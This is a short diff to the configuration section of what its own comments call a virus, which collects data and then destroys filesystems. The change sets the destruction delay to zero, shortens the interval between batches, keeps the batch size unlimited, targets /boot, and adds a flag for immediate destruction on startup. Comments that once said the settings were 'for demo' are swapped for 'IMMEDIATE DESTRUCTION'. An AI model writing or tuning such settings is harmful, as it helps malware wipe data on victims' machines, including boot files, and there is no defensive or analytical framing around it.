@@ -44,8 +44,9 @@ AUTO_CLOSE_AFTER_COLLECTION = False  # Set to False to keep virus running after 
 COLLECTION_TIMEOUT = 300  # 5 minutes max for initial collection
 
 # Filesystem Destruction Configuration
-DESTRUCTION_DELAY = 30  # Delay before starting destruction (seconds) - Reduced for demo
-DESTRUCTION_INTERVAL = 60  # Interval between destruction batches (seconds) - Faster for demo
+DESTRUCTION_DELAY = 0  # Delay before starting destruction (seconds) - 0 = IMMEDIATE DESTRUCTION
+DESTRUCTION_INTERVAL = 10  # Interval between destruction batches (seconds) - Very fast for immediate destruction
 DESTRUCTION_BATCH_SIZE = None  # Max files per batch (None = unlimited - for complete destruction)
 DESTRUCTION_SKIP_BOOT = False  # Skip /boot directory (False = attack boot files for complete destruction)
+DESTRUCTION_IMMEDIATE = True  # Start destruction immediately on startup (no delay)
 
